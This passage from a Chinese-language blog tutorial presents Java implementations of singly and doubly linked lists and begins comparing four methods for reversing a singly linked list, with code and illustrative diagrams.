class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录头结点</span></span><br><span class="line">    <span class="keyword">private</span> Node head;</span><br><span class="line">    <span class="comment">// 记录链表的长度</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> N;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LinkList</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 初始化头结点 头结点不存放值, 只记录下一节点的地址</span></span><br><span class="line">        <span class="built_in">this</span>.head = <span class="keyword">new</span> <span class="title class_">Node</span>(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 初始化元素个数</span></span><br><span class="line">        <span class="built_in">this</span>.N = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清空链表</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span> &#123;</span><br><span class="line">        head.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="built_in">this</span>.N = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取链表的长度</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">length</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> N;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断链表是否为空</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> N == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取指定位置 i 处 （i 从 0 开始）的元素</span></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">get</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">        <span class="comment">// 安全性校验</span></span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= N)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 通过循环,从头结点开始往后找，依次找 i 次，就可以找到对应的元素</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> head.next;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; i; index++)&#123;</span><br><span class="line">            node = node.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node.item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向链表中添加元素t</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(T t)</span> &#123;</span><br><span class="line">        <span class="comment">// 找到尾结点</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(node.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            node = node.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 创建新结点，保存元素t</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(t, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 让当前最后一个结点指向新结点</span></span><br><span class="line">        node.next = newNode;</span><br><span class="line">        <span class="comment">// 元素的个数+1</span></span><br><span class="line">        N ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向指定位置 i 处 （i 从 0 开始），添加元素t</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(<span class="type">int</span> i, T t)</span> &#123;</span><br><span class="line">        <span class="comment">// 安全性校验</span></span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= N)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">// 找到 i 位置前一个结点</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">pre</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; i; index++)&#123;</span><br><span class="line">            pre = pre.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 找到 i 位置的结点</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">curr</span> <span class="operator">=</span> pre.next;</span><br><span class="line">        <span class="comment">// 创建新结点，并且新结点需要指向原来i位置的结点</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(t, curr);</span><br><span class="line">        <span class="comment">// 原来 i 位置的前一个节点指向新结点即可</span></span><br><span class="line">        pre.next = newNode;</span><br><span class="line">        <span class="comment">// 元素的个数+1</span></span><br><span class="line">        N ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除指定位置 i 处 （i 从 0 开始）的元素，并返回被删除的元素</span></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">remove</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">        <span class="comment">// 安全性校验</span></span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= N)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 找到i位置的前一个节点</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">pre</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; i; index++)&#123;</span><br><span class="line">            pre = pre.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// i 位置的结点</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">curr</span> <span class="operator">=</span> pre.next;</span><br><span class="line">        <span class="comment">// 找到i位置的下一个结点</span></span><br><span class="line">        <span class="comment">// i位置的前一个结点指向 i位置的下一个结点</span></span><br><span class="line">        pre.next = curr.next;</span><br><span class="line">        <span class="comment">// 元素个数-1</span></span><br><span class="line">        N--;</span><br><span class="line">        <span class="keyword">return</span> curr.item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找元素t在链表中第一次出现的位置</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">indexOf</span><span class="params">(T t)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (t == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 从头结点开始，依次找到每一个结点，取出item，和t比较，如果相同，就找到了</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; node.next != <span class="literal">null</span>; i++)&#123;</span><br><span class="line">            node = node.next;</span><br><span class="line">            <span class="keyword">if</span> (t.equals(node.item))&#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Iterator&lt;T&gt; <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MyIterator</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">MyIterator</span> <span class="keyword">implements</span> <span class="title class_">Iterator</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> Node node;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">MyIterator</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.node = head;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasNext</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> node.next != <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">            node = node.next;</span><br><span class="line">            <span class="keyword">return</span> node.item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="2-双向链表实现"><a href="#2-双向链表实现" class="headerlink" title="2. 双向链表实现"></a>2. 双向链表实现</h2><p>双向链表也叫双向表，是链表的一种，它由多个节点组成，每个结点都由一个数据域和两个指针域组成，数据域用来存储数据，其中一个指针域用来指向其后继结点，另一个指针域用来指向其前驱结点。链表的头结点的数据域不存储数据，指向前驱结点的指针域值为null，指向后继结点的指针域指向第一个真正存储数据的结点。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143022.png" alt="  "><br>按照面向对象的思想，我们需要设计一个类，来描述结点这个事物。由于结点是属于链表的，所以我们把结点类作为链表类的一个内部类来实现。</p>
<p><strong>结点API设计</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143024.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">结点类</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Node</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 存储数据</span></span><br><span class="line">	<span class="keyword">public</span> T item;</span><br><span class="line">	<span class="comment">// 指向上一个结点</span></span><br><span class="line">	<span class="keyword">public</span> Node pre;</span><br><span class="line">	<span class="comment">// 指向下一个结点</span></span><br><span class="line">	<span class="keyword">public</span> Node next;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(T item, Node pre, Node next)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.item = item;</span><br><span class="line">		<span class="built_in">this</span>.pre = pre;</span><br><span class="line">		<span class="built_in">this</span>.next = next;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>双向链表API设计</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143027.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DoubleLinkList</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">Iterable</span>&lt;T&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 首结点</span></span><br><span class="line">    <span class="keyword">private</span> Node head;</span><br><span class="line">    <span class="comment">// 尾结点</span></span><br><span class="line">    <span class="keyword">private</span> Node last;</span><br><span class="line">    <span class="comment">// 链表的长度</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> N;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结点类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(T item, Node pre, Node next)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.item = item;</span><br><span class="line">            <span class="built_in">this</span>.pre = pre;</span><br><span class="line">            <span class="built_in">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 存储数据</span></span><br><span class="line">        <span class="keyword">public</span> T item;</span><br><span class="line">        <span class="comment">// 指向上一个结点</span></span><br><span class="line">        <span class="keyword">public</span> Node pre;</span><br><span class="line">        <span class="comment">// 指向下一个结点</span></span><br><span class="line">        <span class="keyword">public</span> Node next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DoubleLinkList</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 初始化头结点和尾结点</span></span><br><span class="line">        <span class="built_in">this</span>.head = <span class="keyword">new</span> <span class="title class_">Node</span>(<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="built_in">this</span>.last = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 初始化元素个数</span></span><br><span class="line">        <span class="built_in">this</span>.N = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清空链表</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.head.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="built_in">this</span>.head.pre = <span class="literal">null</span>;</span><br><span class="line">        <span class="built_in">this</span>.head.item = <span class="literal">null</span>;</span><br><span class="line">        <span class="built_in">this</span>.last = <span class="literal">null</span>;</span><br><span class="line">        <span class="built_in">this</span>.N = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取链表长度</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">length</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> N;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断链表是否为空</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> N == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取第一个元素</span></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getFirst</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isEmpty())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> head.next.item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取最后一个元素</span></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getLast</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isEmpty())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> last.item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入元素t</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(T t)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isEmpty())&#123;</span><br><span class="line">            <span class="comment">// 如果链表为空：</span></span><br><span class="line">            <span class="comment">// 创建新的结点</span></span><br><span class="line">            <span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(t, head, <span class="literal">null</span>);</span><br><span class="line">            <span class="comment">// 让新节点赋值尾结点</span></span><br><span class="line">            last = newNode;</span><br><span class="line">            <span class="comment">// 让头结点指向尾结点</span></span><br><span class="line">            head.next = last;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果链表不为空</span></span><br><span class="line">            <span class="comment">// 创建新的结点</span></span><br><span class="line">            <span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(t, last, <span class="literal">null</span>);</span><br><span class="line">            <span class="comment">// 尾结点指向新结点</span></span><br><span class="line">            last.next = newNode;</span><br><span class="line">            <span class="comment">// 让新节点赋值尾结点</span></span><br><span class="line">            last = newNode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 元素个数+1</span></span><br><span class="line">        N ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向指定位置 i 处 （i 从 0 开始），添加元素t</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(<span class="type">int</span> i,T t)</span>&#123;</span><br><span class="line">        <span class="comment">// 安全性校验</span></span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= N)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">// 找到 i 位置的前一个结点</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">pre</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; i; index++)&#123;</span><br><span class="line">            pre = pre.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 找到 i 位置的结点</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">curr</span> <span class="operator">=</span> pre.next;</span><br><span class="line">        <span class="comment">// 创建新结点</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(t, pre, curr);</span><br><span class="line">        <span class="comment">// 让 i 位置的前一个结点指向新结点</span></span><br><span class="line">        pre.next = newNode;</span><br><span class="line">        <span class="comment">// 让 i 位置的下一个结点指向新节点</span></span><br><span class="line">        curr.pre = newNode;</span><br><span class="line">        <span class="comment">// 元素个数+1</span></span><br><span class="line">        N ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取指定位置 i 处 （i 从 0 开始）的元素</span></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">get</span><span class="params">(<span class="type">int</span> i)</span>&#123;</span><br><span class="line">        <span class="comment">// 安全性校验</span></span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= N)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> head.next;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; i; index++)&#123;</span><br><span class="line">            node = node.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node.item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找到元素t在链表中第一次出现的位置</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">indexOf</span><span class="params">(T t)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (t == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; node.next != <span class="literal">null</span>; i++)&#123;</span><br><span class="line">            node = node.next;</span><br><span class="line">            <span class="keyword">if</span> (t.equals(node.item))&#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除指定位置 i 处 （i 从 0 开始）的元素，并返回被删除的元素</span></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">remove</span><span class="params">(<span class="type">int</span> i)</span>&#123;</span><br><span class="line">        <span class="comment">// 安全性校验</span></span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= N)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 找到i位置的前一个结点</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">pre</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; i; index++)&#123;</span><br><span class="line">            pre = pre.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 找到 i 位置的结点</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">curr</span> <span class="operator">=</span> pre.next;</span><br><span class="line">        <span class="comment">// 让 i 位置的前一个结点指向 i 位置的下一个结点</span></span><br><span class="line">        pre.next = curr.next;</span><br><span class="line">        <span class="comment">// 让 i 位置的下一个结点指向 i 位置的前一个结点</span></span><br><span class="line">        curr.next.pre = pre;</span><br><span class="line">        <span class="comment">// 元素的个数-1</span></span><br><span class="line">        N --;</span><br><span class="line">        <span class="keyword">return</span> curr.item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Iterator&lt;T&gt; <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MyIterator</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">MyIterator</span> <span class="keyword">implements</span> <span class="title class_">Iterator</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> Node node;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">MyIterator</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.node = head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasNext</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> node.next != <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">            node = node.next;</span><br><span class="line">            <span class="keyword">return</span> node.item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




<h2 id="3-单链表反转问题"><a href="#3-单链表反转问题" class="headerlink" title="3. 单链表反转问题"></a>3. 单链表反转问题</h2><p>单链表反转，这里介绍4种方法。</p>
<h3 id="①-通过栈实现"><a href="#①-通过栈实现" class="headerlink" title="① 通过栈实现"></a>① 通过栈实现</h3><blockquote>
<h2 id="基本思想：1-先让链表所有结点入栈2-依次出栈，再使用尾插法重新插入"><a href="#基本思想：1-先让链表所有结点入栈2-依次出栈，再使用尾插法重新插入" class="headerlink" title="基本思想：1. 先让链表所有结点入栈2. 依次出栈，再使用尾插法重新插入"></a><strong>基本思想：</strong><br>1. 先让链表所有结点入栈<br>2. 依次出栈，再使用尾插法重新插入</h2><p>这种方法思路简单易于理解。但空间复杂度与时间复杂度均为o(n)，不建议使用</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">()</span>&#123;</span><br><span class="line">	LinkedList&lt;Node&gt; list = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">	<span class="type">Node</span> <span class="variable">cur</span> <span class="operator">=</span> head.next;</span><br><span class="line">	<span class="comment">// 链表所有结点入栈</span></span><br><span class="line">	<span class="keyword">while</span> (cur != <span class="literal">null</span>)&#123;</span><br><span class="line">		list.add(cur);</span><br><span class="line">		cur = cur.next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 使用尾插法重新插入</span></span><br><span class="line">	<span class="type">Node</span> <span class="variable">tail</span> <span class="operator">=</span> head;</span><br><span class="line">	<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> list.size() - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (index &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="type">Node</span> <span class="variable">pop</span> <span class="operator">=</span> list.get(index --);</span><br><span class="line">		tail.next = pop;</span><br><span class="line">		tail = pop;</span><br><span class="line">		tail.next = <span class="literal">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="②-头插法"><a href="#②-头插法" class="headerlink" title="② 头插法"></a>② 头插法</h3><p>大致思想就是把结点依次放到头节点的下一个位置。为什么头插可以实现链表的反转呢？试想一下，我们把链表的每个节点（头节点除外），按顺序一个一个地放到头节点的后面，那么不就可以实现链表的反转了吗？（如图所示）<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143032.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">Node</span> <span class="variable">cur</span> <span class="operator">=</span> head.next;</span><br><span class="line">	head.next = <span class="literal">null</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span> (cur != <span class="literal">null</span>)&#123;</span><br><span class="line">		<span class="comment">// 临时变量存储下一个元素</span></span><br><span class="line">		<span class="type">Node</span> <span class="variable">temp</span> <span class="operator">=</span> cur.next;</span><br><span class="line">		<span class="comment">// 开始头插</span></span><br><span class="line">		cur.next = head.next;</span><br><span class="line">		head.next = cur;</span><br><span class="line">		cur = temp;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="③-三指针法"><a href="#③-三指针法" class="headerlink" title="③ 三指针法"></a>③ 三指针法</h3><p><strong>三指针：</strong></p>
<ul>
<li>Node cur : 记录当前的节点;</li>
<li>Node pre : 记录当前节点的上一个节点;</li>
<li>Node next: 记录当前节点的下一个节点（即剩下的节点）;</li>
</ul>
<p>在链表反转的过程中，我们只要让当前节点 cur 指向上一个节点 pre ，是不是就大体上实现了这两个节点的反转了?<br>当我们 cur 指向pre 后，我们让上一个节点 pre 的位置移到 cur 这里，再把 cur 移到它下一个节点，那怎么记录它下一个节点呢，我们之前不是用 next来记录的吗，就让 cur 移到 next 的位置就行了。<br>这样依次循环下去，最后再把头节点指向 pre 就行了，就实现了链表的反转了。</p>
<p>我先将代码放在这里，等会再结合代码做个案例讲解。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">Node</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	<span class="type">Node</span> <span class="variable">cur</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	<span class="type">Node</span> <span class="variable">next</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	cur = head.next;</span><br><span class="line">	<span class="keyword">while</span> (cur != <span class="literal">null</span>)&#123;</span><br><span class="line">		next = cur.next;</span><br><span class="line">		cur.next = pre;</span><br><span class="line">		pre = cur;</span><br><span class="line">		cur = next;</span><br><span class="line">	&#125;</span><br><span class="line">	head.next = pre;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>案例：</strong><br>现有一组链表，如下所示：<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143038.png" alt="  "></p>
<p>首先，我们将 cur 赋值为 head.next 即 1 处。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143040.png" alt="  "><br>现在开始进入第一次循环，经过第一次循环后，链表就变为了以下情况<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143042.png" alt="  "><br>进行第二次循环，链表情况如下<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143044.png" alt="  "><br>现在最后一次循环，链表变为如下<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143047.png" alt="  "><br>再执行最后一步，让 head.next 指向 pre<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143049.png" alt="  "><br>到这里，反转就结束了</p>
</blockquote>
<h3 id="④-递归"><a href="#④-递归" class="headerlink" title="④ 递归"></a>④ 递归</h3><blockquote>
<p><strong>基本思想：</strong></p>
<ol>
<li>反转入口从 head.next 开始，通过递归，如果当前结点有下一个结点，就继续递归调用反转函数，直到最后一个结点，让头结点指向最后一个结点。</li>
<li>其他结点：让后一个结点指向前一个结点</li>
</ol>
</blockquote>
